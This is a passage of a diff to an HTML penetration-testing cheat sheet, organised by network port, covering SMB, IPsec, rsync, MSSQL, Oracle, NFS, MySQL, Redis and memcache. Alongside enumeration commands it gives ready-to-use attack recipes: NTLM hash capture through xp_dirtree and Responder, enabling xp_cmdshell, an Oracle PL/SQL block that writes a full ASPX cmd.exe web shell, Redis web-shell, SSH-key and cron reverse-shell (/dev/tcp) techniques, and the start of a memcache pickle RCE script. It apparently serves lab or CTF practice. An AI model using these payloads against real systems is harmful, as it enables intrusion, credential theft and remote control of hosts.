+            <td>impacket-reg -hashes &lt;LM:NTLM hashes&gt; &lt;domain&gt;/&lt;username&gt;@&lt;ip address&gt; query -keyName HKU\\</td>
+        </tr>
+        <tr>
+            <td>Query HKLM</td>
+            <td>impacket-reg -hashes &lt;LM:NTLM hashes&gt; &lt;domain&gt;/&lt;username&gt;@&lt;ip address&gt; query -keyName HKLM\\</td>
+        </tr>
+    </table>
+    <li>Interesting registeries</li>
+    <ul>
+        <li>Some software might store secrets in this directory</li>
+    </ul>
 
-<h2>6379 TCP / redis</h2>
-<li>Key store / value storage</li>
-<li>RCE Methods:</li>
-<ul>
-    <li>Create php web shell</li>
-    <li>If able to upload files (not using redis) to victim, upload module for RCE</li>
-    <li>=&lt;5.0.5(?) clone-master RCE</li>
-    <li>Create SSH key on victim</li>
-    <li>Create malicious cronjob</li>
-</ul>
-<li>Tools</li>
-<ul>
-    <li>redis-cli</li>
+    <li>Responder</li>
+    <ul>
+        <li>Intercept SMB logon requests and gain the hash to crack</li>
+    </ul>
+    <li>smbpasswd</li>
+    <table>
+        <tr>
+            <td>Change user password</td>
+            <td>smbpasswd -U &lt;username&gt; -r &lt;domain or ip&gt;</td>
+        </tr>
+    </table>
+    <li>nmap</li>
+    <table>
+        <td>
+            <li>Enumerate share paths</li>
+            <ul>
+                <li>May append a C: to the beginning even if it is a Linux host</li>
+            </ul>
+        </td>
+        <td>nmap --script smb-enum-shares</td>
+    </table>
+    <li>smbmap</li>
     <table>
         <tr>
             <td>
-                <li>Get redis info / test if authentication is require</li>
+                <li>list smb shares</li>
                 <ul>
-                    <li>By default redis does not require credentials</li>
-                    <li>Redis can be configured to require only a password or username + password</li>
+                    <li>Attempt with non-existent username</li>
+                </ul>
+            </td>
+            <td>smbmap –H &lt;ip address&gt; -u &lt;username ex. guest&gt;</td>
+        </tr>
+        <tr>
+            <td>Recursively show  all files/shares</td>
+            <td>-R</td>
+        </tr>
+    </table>
+    <li>smbclient</li>
+    <table>
+        <tr>
+            <td>List smb shares</td>
+            <td>smbclient -L &lt;ip address&gt;</td>
+        </tr>
+        <tr>
+            <td>Download all SMB files w/ smbclient</td>
+            <td>
+                <li>smbclient //&lt;ip address&gt;/&lt;share name&gt;</li>
+                <li>recurse ON</li>
+                <li>prompt OFF</li>
+                <li>mget *</li>
+            </td>
+        </tr>
+        <tr>
+            <td>Connect to share</td>
+            <td>smbclient //&lt;ip address&gt;/&lt;share name&gt;</td>
+        </tr>
+        <tr>
+            <td>Show extended file attributes</td>
+            <td>allinfo &lt;file&gt;</td>
+        </tr>
+        <tr>
+            <td>Download data stream file</td>
+            <td>get "&lt;Parent File&gt;:&lt;Data Stream File&gt;"</td>
+        </tr>
+    </table>
+    <li>smbcacls</li>
+    <table>
+        <tr>
+            <td>See folder permissions</td>
+            <td>smbcacls -N '//&lt;ip address&gt;/&lt;share&gt;' /&lt;folder&gt;</td>
+        </tr>
+    </table>
+    <li>If access to write to SMB share</li>
+    <ul>
+        <li>SCF File attack</li>
+        <ul>
+            <li>Create icon on windows that has the icon image set on remote ip.  When Windows tries to pull that icon it authenticates to the remote server.  Hash can then be stolen.</li>
+            <li>https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/</li>
+        </ul>
+    </ul>
+    <li>Enumerate samba version</li>
+    <table>
+        <tr>
+            <td>Wireshark</td>
+            <td>
+                <li>Log in anonymously (smbclient -L \\&lt;ip address&gt;)</li>
+                <li>Search for packet with "Session Setup Andx Responses" in the info field</li>
+            </td>
+        </tr>
+        <tr>
+            <td>ngrep & smbclient</td>
+            <td>
+                <li>Terminal 1</li>
+                <ul>
+                    <li>ngrep -i -d tap0 's.?a.?m.?b.?a.*[[:digit:]]' port 139</li>
+                </ul>
+                <li>Terminal 2</li>
+                <ul>
+                    <li>echo exit | smbclient -L &lt;ip address&gt;</li>
+                </ul>
+            </td>
+        </tr>
+    </table>
+    <li>Error correction - NT_STATUS_CONNECTION_DISCONNECTED</li>
+    <ul>
+        <li>Most likely smb is using too new of a protocol and needs to be manually set to use an older one</li>
+        <table>
+            <tr>
+                <td>Fix #1 - smbclient flag</td>
+                <td>smbclient //&lt;ip address&gt;/&lt;share name&gt; --option='client min protocol=NT1'</td>
+            </tr>
+            <tr>
+                <td>Fix #2 - Change config file</td>
+                <td>
+                    <li>Append to global section of /etc/samba/smb.conf:</li>
                     <ul>
-                        <li>If only the passsword is set, then the username is "default"</li>
-                        <li>There is no way to know externally if password or password & username are set.</li>
-                        <li>redis.conf is the configuration file.  requirepass and masteruser are the username and password settings</li>
+                        <li>client min protocol = NT1</li>
+                        <ul>
+                            <li>Might need client min protocol = LANMAN1</li>
+                        </ul>
+                    </ul>
+                    <li>service smbd restart</li>
+                </td>
+            </tr>
+        </table>
+    </ul>
+    <li> SMB Protocols</li>
+    <ul>
+        <li>By default SMB2 selects the SMB2_10 variant.</li>
+        <li>By default SMB3 selects the SMB3_00 variant.</li>
+    </ul>
+    <table>
+        <tr>
+            <td>LANMAN1</td>
+            <td>First modern version of the protocol. Long filename support.</td>
+        </tr>
+        <tr>
+            <td>LANMAN2</td>
+            <td> Updates to Lanman1 protocol.</td>
+        </tr>
+        <tr>
+            <td>NT1</td>
+            <td>Current up to date version of the protocol. Used by Windows NT. Known as CIFS.</td>
+        </tr>
+        <tr>
+            <td>SMB2</td>
+            <td>Re-implementation of the SMB protocol. Used by Windows Vista and later versions of Windows. SMB2 has sub protocols available.</td>
+        </tr>
+        <tr>
+            <td>SMB2_02</td>
+            <td>The earliest SMB2 version.</td>
+        </tr>
+        <tr>
+            <td>SMB2_10</td>
+            <td>Windows 7 SMB2 version.</td>
+        </tr>
+        <tr>
+            <td>SMB2_22</td>
+            <td>Early Windows 8 SMB2 version.</td>
+        </tr>
+        <tr>
+            <td>SMB2_24</td>
+            <td>Windows 8 beta SMB2 version.</td>
+        </tr>
+        <tr>
+            <td>SMB3</td>
+            <td>The same as SMB2. Used by Windows 8. SMB3 has sub protocols available.</td>
+        </tr>
+        <tr>
+            <td>SMB3_00</td>
+            <td>Windows 8 SMB3 version. (mostly the same as SMB2_24)</td>
+        </tr>
+    </table>
+
+    <h2>464 TCP / kpasswd5</h2>
+    <li>Used for changing/setting passwords against Active Directory.</li>
+    <br>
+    <h2>500 UDP / ISAKMP</h2>
+    <li>Used for Internet Key Exchange (IKE)</li>
+    <li>nmap can only scan open TCP ports through IPSEC VPN using -sT (connect scan?)</li>
+    <ul>
+        <li>Used to establish an IPSEC VPN</li>
+        <ul>
+            <li>Internet Protocol Security (IPSEC) is a suite of tools that are used for securing network traffic at the IP Layer.</li>
+            <ul>
+                <li>AH and ESP protocols provide security assurances:</li>
+                <ul>
+                    <li>Authentication Header (AH)</li>
+                    <ul>
+                        <li>Provides data integrity (We will now if the data has been modified between senders).</li>
+                        <li>Data source authentication (We will know if the source isn't what is expected for that connection).</li>
+                        <li>Protection against replay attacks.</li>
+                    </ul>
+                    <li>Encapsulating Security Payloads(ESP)</li>
+                    <ul>
+                        <li>Provides similar capabilities as AH plus confidentiality (Someone in the middle won't be able to see the data)</li>
+                    </ul>
+                    <li>Both of these protocols can operate in two modes:</li>
+                    <ul>
+                        <li>Transport mode</li>
+                        <ul>
+                            <li>The IP of the packet is sent in the clear over the internet for routing, but the payload is encrypted.</li>
+                            <li>Typically used directly host to host</li>
+                        </ul>
+                        <li>Tunnel mode</li>
+                        <ul>
+                            <li>The entire IP packet is encrypted and becomes the payload of another IP packet.  The header of the new packet directs where the packet goes.</li>
+                            <li>Typically used when a computer is behind a network.</li>
+                        </ul>
+                    </ul>
+                </ul>
+                <li>There are also security associations (SA) used with IPSEC.  This provides a bundle of algorithms to dynamically exchange keys and establish a secure connection over AH or ESP.  IKE is one of those.</li>
+            </ul>
+        </ul>
+    </ul>
+    <li>Tools:</li>
+    <ul>
+        <li>ike-scan</li>
+        <ul>
+            <li>ike-scan -M &lt;ip address&gt;</li>
+            <ul>
+                <li>Enumerates:</li>
+                <ul>
+                    <li>IKE Encryption type</li>
+                    <li>Auth type (PSK, etc)</li>
+                    <li>IKE version (v1 or v2)</li>
+                </ul>
+            </ul>
+        </ul>
+        <li>strongswan</li>
+        <ul>
+            <li>Used to connect to VPN once password is known</li>
+            <li>Avoid errors:</li>
+            <ul>
+                <li>sudo apt install libstrongswan-standard-plugins</li>
+                <li>sudo apt install libstrongswan-extra-plugins</li>
+            </ul>
+            <li>Must edit local files to connect to VPN</li>
+            <ul>
+                <li>/etc/ipsec.secrets</li>
+                <table>
+                    <tr>
+                        <td>Fields Explained</td>
+                        <td><pre># This file holds shared secrets or RSA private keys for authentication.
+                        %any : &lt;Authentication Type - Example: PSK&gt; "&lt;VPN Password&gt;"</pre></td>
+                    </tr>
+                    <tr>
+                        <td>Example file</td>
+                        <td><pre># This file holds shared secrets or RSA private keys for authentication.
+                        %any : PSK "Dudecake1!"</pre></td>
+                    </tr>
+                </table>
+                <li>/etc/ipsec.conf</li>
+                <table>
+                    <tr>
+                        <td>Fields Explained</td>
+                        <td><pre># ipsec.conf - strongSwan IPsec configuration file
+
+                            config setup
+                            charondebug="all"
+                            # More verbose for troubleshooting connection
+
+                            uniqueids=yes
+                            strictcrlpolicy=no
+                            conn conceal
+                            authby=secret
+                            # Auth type.  PSK = secret
+
+                            auto=add
+                            ike=&lt;Value 1&gt;-&lt;Value 2&gt;-&lt;Value 3&gt;!
+                            # ike-scan values: Enc=&lt;Value 1&gt; Hash=&lt;Value 2&gt;; Group=2:&lt;value 3&gt;
+
+                            esp=&lt;Value 1&gt;-&lt;Value 2&gt;!
+                            # ike-scan values: Enc=&lt;Value 1&gt;; Hash=&lt;Value 2&gt;
+
+                            type=transport
+                            # ipsec transport mode
+
+                            keyexchange=ikev1
+                            # ike-scan value: (IKE CGA version 1) = ikev1
+
+                            left=&lt;Local Machine IP&gt;
+                            right=&lt;Remote Machine IP&gt;
+                            rightsubnet=&lt;Remote Machine IP&gt;[tcp]
+                        </pre></td>
+                    </tr>
+                    <tr>
+                        <td>Example File</td>
+                        <td><pre># ipsec.conf - strongSwan IPsec configuration file
+
+                            config setup
+                            charondebug="all"
+                            uniqueids=yes
+                            strictcrlpolicy=no
+
+                            conn conceal
+                            authby=secret
+                            auto=add
+                            ike=3des-sha1-modp1024!
+                            esp=3des-sha1!
+                            type=transport
+                            keyexchange=ikev1
+                            left=10.10.14.6
+                            right=10.10.10.116
+                        rightsubnet=10.10.10.116[tcp]</pre></td>
+                    </tr>
+                </table>
+            </ul>
+        </ul>
+    </ul>
+
+
+    <h2>636 TCP / LDAPS</h2>
+    <li>LDAP SSL connection</li>
+    <br>
+
+    <h2>837 TCP / rsync</h2>
+
+    <table>
+        <tr>
+            <td>Enumerate shared folders</td>
+            <td>rsync &lt;ip address&gt;::</td>
+        </tr>
+        <tr>
+            <td>List files in a shared folder</td>
+            <td>rysnc &lt;ip&gt;::&lt;rsync share&gt;</td>
+        </tr>
+        <tr>
+            <td>Download a file from remote machine</td>
+            <td>rsync &lt;ip address&gt;::&lt;remote file&gt; &lt;local directory&gt;</td>
+        </tr>
+        <tr>
+            <td>Download a directory from remote machine</td>
+            <td>rsync -r &lt;ip address&gt;::&lt;remote directory/share&gt; &lt;local directory&gt;</td>
+        </tr>
+        <tr>
+            <td>Create remote directory on local machine</td>
+            <td>rsync -av rsync://&lt;username&gt;@&ltip address:port&gt;/&lt;share name&gt; ./&lt;&lt;local directory>&gt;</td>
+        </tr>
+        <tr>
+            <td>Upload a file to remote machine</td>
+            <td>rsync ./&lt;local file&gt; &lt;ip&gt;::&lt;remote directory&gt;</td>
+        </tr>
+        <tr>
+            <td>Upload directory to remote machine</td>
+            <td>rsync -r ./&lt;local directory&gt; &lt;ip address&gt;::&lt;remote directory&gt;</td>
+        </tr>
+        <tr>
+            <td>Upload/create directory on local machine on remote machine</td>
+            <td>rsync -av ./.ssh rsync://&lt;ip address&gt;/&lt;share name&gt;</td>
+        </tr>
+        <tr>
+            <td>Specify a ssh port for rsync if ssh is not running on 22</td>
+            <td>rync -a -e "ssh -p &lt;port #&gt;" &lt;local directory&gt; &lt;user&gt;@&lt;ip address&gt;:&lt;directory&gt;</td>
+        </tr>
+    </table>
+
+    <h2>1025 TCP / msrpc</h2>
+    <br>
+    <h2>1433 TCP / Microsoft SQL</h2>
+    <li>Good resource: http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet</li>
+    <li>Retrieve mssql service's password using smb</li>
+    <table>
+        <tr>
+            <td>Set listener on Kali</td>
+            <td>sudo responder -I tun0</td>
+        </tr>
+        <tr>
+            <td>Connect to non-existing SMB server from mssql</td>
+            <td>xp_dirtree '\\&lt;ip address&gt;\&lt;fake share name&gt;'</td>
+        </tr>
+        <tr>
+            <td>Crack the NetNTLMv2 output hash on Kali responder</td>
+            <td>hashcat -m 5600</td>
+        </tr>
+        <tr>
+            <td>Log in with mssql-svc password retrieved</td>
+            <td>mssqlclient mssql-svc:'&ls;password&gt;'@&lt;ip&gt; -windows-auth</td>
+        </tr>
+    </table>
+    <li>Run / enable shell commands</li>
+    <table>
+        <tr>
+            <td>Enable xp_cmdshell (with impacket-mssqlclient)</td>
+            <td>enable_xp_cmdshell</td>
+        </tr>
+        <tr>
+            <td>Run shell command (with impacket-mssqlclient)</td>
+            <td>xp_cmdshell &lt;command&gt;</td>
+        </tr>
+        <tr>
+            <td>Enable xp_cmdshell (without impacket-mssqlclient)</td>
+            <td>EXEC sp_configure 'show advanced options', 1;<br>RECONFIGURE;<br>EXEC sp_configure 'xp_cmdshell', 1;<br>RECONFIGURE;</td>
+        </tr>
+        <tr>
+            <td>Run shell command (without impacket-mssqlclient)</td>
+            <td>EXEC xp_cmdshell '&lt;command&gt;';</td>
+        </tr>
+    </table>
+    <li>sqsh</li>
+    <ul>
+        <li>append server to /etc/freetds/freetds.config</li>
+        <pre>[&lt;hostname&gt;]
+            host = &lt;ip&gt;
+            port = &lt;port #&gt;
+        tds version = &lt;Examples: 5.0, 7.3, 8.0&gt;</pre>
+        <li>Commands</li>
+        <table>
+            <tr>
+                <td>Login</td>
+                <td>sqsh -S &lt;ip&gt; -U &lt;user&gt; -P &lt;password&gt;<br>&lt;ip address&gt; can be replaced with hostname if specified in freetds.config file</td>
+            </tr>
+            <tr>
+                <td>Send command</td>
+                <td>go (after entering command)</td>
+            </tr>
+        </table>
+    </ul>
+    <li>Mssql commands</li>
+    <table>
+        <tr>
+            <td>Run shell command</td>
+            <td>EXEC xp_cmdshell '&lt;command&gt;'</td>
+        </tr>
+        <tr>
+            <td>Enable xp_cmdshell</td>
+            <td>EXEC sp_configure 'show advanced options', 1;<br>RECONFIGURE;<br>EXEC sp_configure 'xp_cmdshell', 1;<br>RECONFIGURE;</td>
+        </tr>
+        <tr>
+            <td>View databases</td>
+            <td>SELECT name FROM master.dbo.sysdatabases</td>
+        </tr>
+        <tr>
+            <td>Select/use a database</td>
+            <td>use &lt;db&gt;</td>
+        </tr>
+        <tr>
+            <td>Get table names</td>
+            <td>SELECT * FROM &lt;db name&gt;.INFORMATION_SCHEMA.TABLES;<br>(use &lt;db&gt; first)SELECT name FROM sysobjects WHERE xtype = 'U'</td>
+        </tr>
+        <tr>
+            <td>List linked servers</td>
+            <td>EXEC sp_linkedservers<br>SELECT * FROM sys.servers;</td>
+        </tr>
+        <tr>
+            <td>List users</td>
+            <td>select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;</td>
+        </tr>
+        <tr>
+            <td>Create user with sysadmin privs</td>
+            <td>CREATE LOGIN &lt;username&gt; WITH PASSWORD = '&lt;password&gt;'<br>sp_addsrvrolemember '&lt;username&gt;', 'sysadmin</td>
+        </tr>
+        <tr>
+            <td>View password hashes</td>
+            <td>SELECT name, password_hash FROM master.sys.sql_logins</td>
+        </tr>
+        <tr>
+            <td>View permissions</td>
+            <td>SELECT * FROM fn_my_permissions(NULL, 'SERVER');</td>
+        </tr>
+    </table>
+
+    <h2>1521 TCP / Oracle TNS Listener</h2>
+
+    <li>Oracle DB exploit guide</li>
+    <ul>
+        <li>blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf</li>
+    </ul>
+    <li>Metasploit for Oracle</li>
+    <ul>
+        <li>blog.zsec.uk/msforacle/</li>
+    </ul>
+    <li>ODAT</li>
+    <ul>
+        <li>Requires sqlplus to run correctly</li>
+
+        <li>Methodology</li>
+        <table>
+            <tr>
+                <td>Enumerate SID for Oracle DB</td>
+                <td>
+                    <li>odat sidguess</li>
+                    <li>auxiliary/scanner/oracle/sid_brute</li>
+                </td>
+            </tr>
+            <tr>
+                <td>Brute force login credentials</td>
+                <td>
+                    <li>odat passwordguesser</li>
+                    <li>auxiliary/scanner/oracle/oracle_login</li>
+                    <li>*Passwords are typically lowercase</li>
+                </td>
+            </tr>
+
+            <tr>
+                <td>Log into Oracle DB</td>
+                <td>sqlplus64 &lt;username&gt;/&lt;password&gt;@&lt;ip address&gt;:&lt;port&gt;/&lt;DB Name&gt;</td>
+            </tr>
+            <tr>
+                <td>Log into Oracle DB with sys db admin (sudo for oracle)</td>
+                <td>sqlplus64 &lt;username&gt;/&lt;password&gt;@&lt;ip address&gt;:&lt;port&gt;/&lt;DB Name&gt; as sysdba</td>
+            </tr>
+        </table>
+
+        <li>ODAT Commands</li>
+        <table>
+            <tr>
+                <td>Scan Oracle DB</td>
+                <td>
+                    <li>odat all -s &lt;ip address&gt; -d &lt;database&gt; -U &lt;username&gt; -P &lt;password&gt;</li>
+                    <li>Add --sysdba flag to authenticate as sysdba (sudo for Oracle)</li>
+                </td>
+            </tr>
+            <tr>
+                <td>Authenticate as sysdba (sudo for Oracle)</td>
+                <td>--sysdba</td>
+            </tr>
+            <tr>
+                <td>Upload file</td>
+                <td>
+                    <li>odat dbmsadvisor -s 10.10.10.82 -d &lt;database&gt; -U &lt;username&gt; -P &lt;password&gt; --sysdba --putFile C:\\inetpub\\wwwroot &lt;remote file&gt; &lt;local file&gt;</li>
+                    <ul>
+                        <li>Also try dbmsxslprocessor instead of dbmsadvisor</li>
+                    </ul>
+                </td>
+            </tr>
+        </table>
+
+        <li>Oracle DB Commands:</li>
+        <table>
+            <tr>
+                <td>View privileges</td>
+                <td>select * from session_privs;<br>select * from user_role_privs;</td>
+            </tr>
+            <tr>
+                <td>Read file</td>
+                <td>declare<br>f utl_file.file_type;<br>s varchar(400);<br>begin<br>f := utl_file.fopen('/inetpub/wwwroot', 'iisstart.htm', 'R');<br>utl_file.get_line(f,s);<br>utl_file.fclose(f);<br>dbms_output.put_line(s);<br>end;</td>
+            </tr>
+            <tr>
+                <td>Write file</td>
+                <td>declare<br>f utl_file.file_type;<br>s varchar(5000) := '&lt;insert text to write&gt;';<br>begin<br>f := utl_file.fopen('/inetpub/wwwroot', '&lt;file to write&gt;', 'W');<br>utl_file.put_line(f,s);<br>utl_file.fclose(f);<br>end;</td>
+            </tr>
+            <tr>
+                <td>Run last procedure</td>
+                <td>/</td>
+            </tr>
+            <tr>
+                <td>View output</td>
+                <td>set serveroutput ON</td>
+            </tr>
+        </table>
+
+    </ul>
+    <li>Generating shell for Oracle</li>
+    <ul>
+        <li>1024 character max</li>
+        <li>aspx for Windows</li>
+        <li>Must all be on one line</li>
+        <ul>
+            <li>sed -z 's/\n//g' &lt;file&gt;</li>
+        </ul>
+        <li>aspx web shell example:</li>
+        <pre>declare
+            f utl_file.file_type;
+            s varchar(5000) := '&lt;%@ Page Language=&quot;C#&quot; Debug=&quot;true&quot; Trace=&quot;false&quot; %&gt;&lt;%@ Import Namespace=&quot;System.Diagnostics&quot; %&gt;&lt;%@ Import Namespace=&quot;System.IO&quot; %&gt;&lt;script Language="c#" runat="server"&gt;void Page_Load(object sender, EventArgs e){}string ExcuteCmd(string arg){ProcessStartInfo psi = new ProcessStartInfo();psi.FileName = "cmd.exe";psi.Arguments = "/c "+arg;psi.RedirectStandardOutput = true;psi.UseShellExecute = false;Process p = Process.Start(psi);StreamReader stmrdr = p.StandardOutput;string s = stmrdr.ReadToEnd();stmrdr.Close();return s;}void cmdExe_Click(object sender, System.EventArgs e){Response.Write("&lt;pre&gt;");Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));Response.Write("&lt;/pre&gt;");}&lt;/script&gt;&lt;HTML&gt;&lt;body &gt;&lt;form id="cmd" method="post" runat="server"&lt;&gt;asp:TextBox id="txtArg" runat="server" Width="250px"&gt;&lt;/asp:TextBox&gt;&lt;asp:Button id="testing" runat="server" Text="excute" OnClick="cmdExe_Click"&gt;&lt;/asp:Button&gt;&lt;asp:Label id="lblText" runat="server"&t;Command:&lt;/asp:Label&gt;&lt;/form&gt;&lt;/body&gt;&lt;/HTML&gt;';
+            begin
+            f := utl_file.fopen('/inetpub/wwwroot', 'shell.aspx', 'W');
+            utl_file.put_line(f,s);
+            utl_file.fclose(f);
+            end;
+        </pre>
+    </ul>
+
+    <h2>2049 TCP / mountd (NFS)</h2>
+    <li>sudo apt install nfs-common</li>
+    <table>
+        <tr>
+            <td>Show paths that can be mounted and who can mount them</td>
+            <td>showmount -e &lt;ip address&gt;</td>
+        </tr>
+        <tr>
+            <td>Show client IP's using the mount</td>
+            <td>showmount -a &lt;ip address&gt;</td>
+        </tr>
+        <tr>
+            <td>mount an NFS path</td>
+            <td>mount -t nfs &lt;ip address&gt;:&lt;nfs share&gt;  &lt;local directory to mount to - Example: /mnt/&gt;</td>
+        </tr>
+    </table>
+
+    <h2>3000 TCP / Express.js Node</h2>
+    <li>hadoop</li>
+    <ul>
+        <li>Big data storage solution</li>
+        <li>Data analytics & Data science</li>
+    </ul>
+
+    <h2>3268 TCP / LDAP
+    </h2>
+    <li>LDAP connection to Global Catalog instead of the local DC which port 389 will return information for</li>
+    <li>LDAP requests sent to port 3268 can be used to search for objects in the entire forest.</li>
+    <li>Only the attributes marked for replication to the global catalog can be returned.</li>
+    <br>
+    <h2>3269 TCP / LDAPS</h2>
+    <li>LDAP connection to Global Catalog over SSL.</li>
+
+    <h2>3306 TCP / MySql</h2>
+    <li>Connect to a mysql database</li>
+    <ul>
+        <li>impacket-mssqlclient username:password@ip.address</li>
+        <li>mysql --host=127.0.0.1 --port=13306 --user=&lt;username&gt; -p&lt;password (no space after -p)&gt;</li>
+        <ul>
+            <li>Connect to local port (port forwarding in this example) 13306 as &lt;username&gt;</li>
+        </ul>
+    </ul>
+
+    <li>User-Defined Functions (UDF)</li>
+    <ul>
+        <li>Similar to a custom plugin for mysql</li>
+        <li>Allows administrators to create custom repeatable functions to accomplish specific objectives</li>
+        <li>Written in C or C++ and will run almost any code including system commands</li>
+    </ul>
+    <table>
+        <tr>
+            <td>Show variables</td>
+            <td>
+                <li>show variables;</li>
+                <ul>
+                    <li>Some possible interesting variabels</li>
+                    <ul>
+                        <li>hostname</li>
+                        <li>tmp directory</li>
+                        <li>version</li>
+                        <li>Architecture</li>
+                        <li>plugin_dir</li>
                     </ul>
                 </ul>
             </td>
-            <td>info</td>
         </tr>
         <tr>
-            <td>Login with credentials</td>
-            <td>AUTH &lt;password&gt;<br>AUTH &lt;username&gt; &lt;password&gt;</td>
+            <td>Show user privileges</td>
+            <td>SHOW grants;</td>
         </tr>
         <tr>
-            <td>Get configuration file contents</td>
-            <td>CONFIG GET *</td>
+            <td>Show individual variable</td>
+            <td>select @@&lt;variable &ndash; ex. plugin_dir&gt;;</td>
         </tr>
         <tr>
-            <td>Show connected clients</td>
-            <td>CLIENT LIST</td>
+            <td>Show plugins directory</td>
+            <td>show variables like '%plugin_dir%';</td>
         </tr>
         <tr>
-            <td>Show keys</td>
-            <td>keys *</td>
+            <td>Show databases</td>
+            <td>use &lt;database name&gt;;</td>
         </tr>
         <tr>
-            <td>Get keys from database</td>
-            <td>SELECT &lt;db # under &quot;# Keyspace&quot; in info&gt;&lt;br&gt;KEYS *&lt;br&gt;GET &lt;Key&gt;</td>
+            <td>Show MariaDB version</td>
+            <td>@@version</td>
         </tr>
         <tr>
-            <td>Web shell RCE</td>
-            <td>config set dir &lt;web server root directory&gt;<br>config set dbfilename shell.php<br>set test "<?php system($_REQUEST['cmd'] ?>"<br>save</td>
+            <td>Show the user being used to make queries</td>
+            <td>user()</td>
         </tr>
         <tr>
-            <td>Upload SSH Key</td>
-            <td>import public key to redis:<br>(echo -e "\n\n"; cat ./.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt<br>cat foo.txt | redis-cli -h &lt;ip addres&gt; -x set crackit<br>config set dir &lt;writable home directory&gt;<br>config set dbfilename<br>"authorized_keys"<br>save</td>
+            <td>Retrieve database information like table and column names.  A lot of information about default objects.</td>
+            <td>id=1 union all select #(1),of(2),columns(3), table_name from information_schema.tables</td>
         </tr>
         <tr>
-            <td>Reverse shell through cronjobs</td>
-            <td>
-                <li>redis-cli -h &lt;ip address&gt; flushall </li>
-                <li>echo -e "\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/&lt;ip address&gt;/&lt;port&gt; 0&gt;&amp;1\n\n&quot;|redis-cli -h &lt;ip address&gt; -x set 1</li>
-                <li>redis-cli -h &lt;ip address&gt; config set dir /var/spool/cron/ </li>
-                <li>redis-cli -h &lt;ip address&gt; config set dbfilename root</li>
-                <li>redis-cli -h &lt;ip address&gt; save</li>
-            </td>
+            <td>Output all columns from a specified table</td>
+            <td>column_name from information_schema.columns where table_name='TableName'</td>
+        </tr>
+        <tr>
+            <td>Select username and password columns from TableName</td>
+            <td>Select username, password from TableName</td>
+        </tr>
+        <tr>
+            <td>Show all columns and records in the users table</td>
+            <td>select * from users;</td>
+        </tr>
+        <tr>
+            <td>Show username field from the users table and only show records with an id of 1.</td>
+            <td>SELECT username FROM users WHERE id=1;</td>
+        </tr>
+        <tr>
+            <td>Load data from file into a table</td>
+            <td>LOAD DATA LOCAL INFILE '/var/www/html/index.php' INTO TABLE &lt;table name&gt; FIELDS TERMINATED BY "\n"</td>
+        </tr>
+        <tr>
+            <td>Change cell contents</td>
+            <td>UPDATE &lt;Table&gt; SET &lt;Column&gt;=&#039;&lt;Value&gt;&#039; WHERE &lt;Column&gt;=&#039;&lt;Value&gt;&#039;;</td>
+        </tr>
+        <tr>
+            <td>Create Database</td>
+            <td>Create Database &lt;Database Name&gt;;</td>
+        </tr>
+        <tr>
+            <td>Create user</td>
+            <td>create user &#039;&lt;username&gt;&#039;@&#039;&lt;host&gt;&#039; IDENTIFIED BY &#039;&lt;password?&gt;&#039;;</td>
+        </tr>
+        <tr>
+            <td>Give all permissions to user</td>
+            <td>GRANT ALL on &lt;database&gt;.* TO &#039;&lt;user&gt;&#039;@&#039;&lt;host&gt;&#039;;</td>
+        </tr>
+        <tr>
+            <td>String delimiter.  Can use to check for SQL injection vulnerabilities</td>
+            <td>'</td>
+        </tr>
+        <tr>
+            <td>Comment marker.  Removes the statement after it from the query.</td>
+            <td>#</td>
+        </tr>
+        <tr>
+            <td>Limit the number of records that a query pulls</td>
+            <td>LIMIT &lt;number&gt;</td>
+        </tr>
+        <tr>
+            <td>Set binary variable</td>
+            <td>set @&lt;variable name&gt; = 0x&lt;binary/hex code&gt;</td>
+        </tr>
+        <tr>
+            <td>Output binary variable to file</td>
+            <td>select binary @&lt;binary variable&gt; into dumpfile &#039;/home/directory/to/put/file/something.so&#039;;</td>
+        </tr>
+        <tr>
+            <td>Information about tables and databases</td>
+            <td>information_schema.tables</td>
         </tr>
     </table>
-</ul>
 
-<h2>6697 TCP / irc</h2>
-<li>Incoming IRC connections encrypted via TLS/SSL</li>
+    <h2>3389 TCP / RDP</h2>
+    <br>
 
-<br>
+    <h2>3690 TCP / SVN</h2>
+    <table>
+        <tr>
+            <td>list svn contents</td>
+            <td>svn list svn://&lt;ip address&gt;</td>
+        </tr>
+        <tr>
+            <td>create local copy of respository </td>
+            <td>svn checkout svn://&lt;ip address&gt;</td>
+        </tr>
+        <tr>
+            <td>Log history</td>
+            <td>svn log</td>
+        </tr>
+        <tr>
+            <td>View/walk revisions</td>
+            <td>svn up -&lt;revision from log&gt;</td>
+        </tr>
+    </table>
 
-<h2>27017 TCP / mongodb</h2>
-<table>
-    <tr>
-        <td>Connect to db</td>
-        <td>mongo -u &lt;username&gt; -p &lt;password&gt; &lt;database&gt;</td>
-    </tr>
-    <tr>
-        <td>show collections (mongodb version of mysql tables)</td>
-        <td>show collections</td>
-    </tr>
-    <tr>
-        <td>search for objects in a collection</td>
-        <td>db.&lt;collection&gt;.find()</td>
-    </tr>
-    <tr>
-        <td>add command/object to collection</td>
-        <td>db.tasks.insert({"cmd&quot;:&quot;&lt;bash command&gt;&quot;})</td>
-    </tr>
-</table>
-
-<h2>11211 TCP / memcache</h2>
-<li>Tools</li>
-<ul>
-    <li>nc</li>
-    <li>telnet</li>
-</ul>
-<li>memcache commands</li>
-<table>
-    <tr>
-        <td>Retrieve cached items list</td>
-        <td>stats items</td>
-    </tr>
-    <tr>
-        <td>
-            <li>View cachedump of key retrieved from "stats items"</li>
-            <ul>
-                <li>STAT items:&lt;#&gt;:age 75, etc</li>
-                <li>0 at the end for dumping unlimited lines</li>
-            </ul>
-        </td>
-        <td>stats cachedump &lt;#&gt; 0</td>
-    </tr>
-</table>
-
-<li>RCE -python pickling</li>
-<ul>
-    <li>pip install pymemcache</li>
-    <li>Generate malicious pickled python object to poison memcached object</li>
+    <h2>5432 TCP Postgresql</h2>
+    <li>Default credentials are</li>
     <ul>
-        <li>Script:</li>
-<pre>
-import pickle
-import os
-import sys
-from pymemcache.client import base
-class RCE:
